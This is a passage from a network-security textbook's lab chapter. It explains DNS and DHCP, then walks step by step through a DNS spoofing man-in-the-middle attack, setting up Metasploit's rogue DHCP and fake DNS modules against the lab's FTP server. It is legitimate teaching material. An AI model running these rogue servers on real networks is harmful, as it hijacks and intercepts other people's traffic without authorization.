DNS MitM attack live on our W4SP Lab. In case anyone jumped right to this section, please first start your Kali VM, run your W4SP Lab script, and set up the Lab. Open a new Terminal and get ready.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As you know, and as mentioned in an earlier chapter, DNS is the protocol that translates human-readable hostnames to the numerical IP address computers can use to route traffic. DNS is a primarily UDP- based protocol, although it also uses TCP over port 53 in either case.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When you type a human-readable hostname into your browser, your system resolves this via a DNS request to convert the hostname into a</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section205" ><p class=MsoBodyText  style="margin-top:3.6000pt;margin-right:11.1500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >routable, usable IP address. There are plenty of variations on the DNS request, including different request types, but all we need here is a DNS request asking for the IP address of a specified hostname.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Obviously, DNS plays a large role on the web, as most sites are accessed via their URLs or fully qualified domain names, not their IP addresses.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note that, like ARP, there is often DNS cache present on systems. This cache is there, like it is for ARP, to provide for faster retrieval, keeping recent DNS lookups. Instead of making a DNS request for the same hostname, the system first refers to local sources, including its local cache for a quick lookup.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >What Is DNS Spoofing?</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:10.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >DNS spoofing is where an attacker is able to manipulate the DNS traffic such that the response maps a specified hostname to the attacker&#8217;s machine instead of the genuine machine using the hostname. Usually, this is accomplished by leveraging a malicious DNS server. Unlike ARP spoofing more easily performed on the local subnet, DNS spoofing works just as easily across the network. In other words, you&#8217;re spoofing a server with a routable address. If you can trick a victim computer into using your malicious DNS server, that server can be anywhere, whether on the same subnet or beyond the victim&#8217;s default gateway. This is because DNS is operated at layer 3 and above, while ARP is dealing with both layer 2 and layer 3. Because you&#8217;re able to perform this at &#8220;arm&#8217;s length&#8221; from the victim, DNS spoofing might be considered safer to perform than ARP poisoning, giving the attacker opportunity to more environments and targets.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:8.0000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >How does every system know how to find its DNS server? Unless the system is set with a static IP address, the DNS server address is dictated by an option from the DHCP server.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >How Is DHCP Involved?</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><a name="_bookmark403" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Again, this is assuming the system is DHCP served, rather than set with a static IP address. An easy assumption, because DHCP is far more common, both in enterprise environments and in home networks.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section206" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Need a quick refresher on what DHCP is for and how it works? As a system boots up, it needs an IP address to connect to the network. If no IP is set already, the system requests an IP from a DHCP server using Dynamic Host Configuration Protocol (DHCP). The DHCP request and response is a straightforward four-step process, affectionately known as the DORA: Discovery, Offer, Request, Acknowledgment. The system booting up is the DHCP client.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following is a quick primer on how this protocol works.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l19 level1 lfo14;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Client sends a Discovery broadcast: &#8220;</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Any DHCP</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.7500pt;font-style:italic;font-size:15.0000pt;" >&nbsp;</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >servers?</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l19 level1 lfo14;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >DHCP server sends an Offer to the client: &#8220;</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Want an</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.9500pt;font-style:italic;font-size:15.0000pt;" >&nbsp;</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >IP?</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l19 level1 lfo14;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Client replies with a Request for that IP address: &#8220;</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >I&#8217;ll take</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.2000pt;font-style:italic;font-size:15.0000pt;" >&nbsp;</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >it</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l19 level1 lfo14;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >4.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >DHCP server Acknowledges: &#8220;</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >It&#8217;s</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3000pt;font-style:italic;font-size:15.0000pt;" >&nbsp;</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >yours</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once the server acknowledges back to the client, the IP address is taken and won&#8217;t be offered to another client. You can see the safeguards in the protocol, ensuring only one IP address per client, after both server and client agree to an address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In addition to the IP address, the DHCP server provides other information, such as how long the IP address is reserved (the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >lease</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >), and the offer also provides DNS server information. This is how we will deliver our spoofed DNS address&#8212;via a fake DHCP server.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Metasploit Providing a Fake DHCP Server</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The action plan here is to start a fake DHCP server and employ a fake DNS server. In the DHCP offer, you will be providing the 192.100.200.x IP address of your own Kali machine as the fake DNS and DHCP servers. What is your IP address? In a new Terminal, run </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sudo ifconfig</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to find out, as shown in<a name="_bookmark404" ></a>&nbsp;</span><span><a href="#_bookmark406" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-10</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section207" ><p class=MsoBodyText  style="margin-left:29.0000pt;" ><img width="710"  height="543"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker267835.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark406" ></a><span><a href="#_bookmark404" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-10:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Noting your IP address</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In your Terminal window, launch the Metasploit framework, typing </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >sudo msfconsole </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to start. At the msf console prompt, you&#8217;ll use the fake DHCP module by typing </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >use auxiliary/server/dhcp</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Then type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >show options </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to see the settings available. The module options are shown in<a name="_bookmark407" ></a>&nbsp;</span><span><a href="#_bookmark408" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-11</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section208" ><p class=MsoBodyText ><img width="778"  height="367"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker268225.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark408" ></a><span><a href="#_bookmark407" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-11:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >DHCP module options</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:9.2000pt;margin-right:40.8000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We will be setting the options for </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >DNSSERVER</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >NETMASK</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SRVHOST</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which are the to-be fake DNS server, its network mask, and the IP address of this fake DHCP server,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >respectively.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;margin-right:7.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Set both </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >DNSSERVER</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SRVHOST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to be your local system&#8217;s IP (starts with 192.100.200.x). Then set </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >NETMASK </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >as 255.255.255.0. When all is complete, run the exploit.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >exploit<a name="_bookmark409" ></a>&nbsp;</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and your screen output should resemble<a name="_bookmark410" ></a>&nbsp;</span><span><a href="#_bookmark411" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-12</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section209" ><p class=MsoBodyText  style="margin-left:29.0000pt;" ><img width="710"  height="525"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker268736.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark411" ></a><span><a href="#_bookmark410" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-12:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >DHCP running</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With the fake DHCP server running, we use Metasploit again to now configure our fake DNS server.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Metasploit Providing a Fake DNS Server</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It&#8217;s time to configure the fake DNS server to resolve any or all IP queries sent to it. This can be one domain or many. We need it to be just one domain, the lab&#8217;s FTP server.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Metasploit module we will use is the auxiliary/server/fakedns module. For this module, the following settings need to be set: </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TARGETACTION</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TARGETDOMAIN</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TARGETHOST</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Working backward on that list, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TARGETHOST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is again your system, the server to resolve DNS queries. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TARGETDOMAIN </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is the domain we want to resolve. Again, for this lab, we will just resolve a query for the lab&#8217;s FTP server. Lastly, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TARGETACTION </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is how we want the DNS server to behave. In this scenario of spoofing an address, the parameter&#8217;s setting is called </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >FAKE</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. For your reference, a way to test this module but not actually alter any</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section210" ><p class=MsoBodyText  align=justify  style="margin-top:3.5500pt;margin-right:21.4000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >queries is to use </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >BYPASS</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >here, which you would then punt any queries to a legitimate DNS server. But for this lab, we want </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >FAKE</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >here, which will resolve our target domain to our own machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once you have those three parameters set, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >exploit </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to start the module. Given the DNS server module is running, you should see screen output similar to<a name="_bookmark412" ></a>&nbsp;</span><span><a href="#_bookmark413" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-13</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Again, the IP address of your own system will likely be different.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="153.75"  height="0" ></td></tr><tr><td></td><td><img width="714"  height="528"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker270193.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark413" ></a><span><a href="#_bookmark412" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-13:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >DNS settings done</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><a name="_bookmark414" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You will soon be reminded that the W4SP Lab environment is humming right along, behind the scenes, as queries get echoed on the screen.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Quieting Down DNS</span></i></b><b><i><span 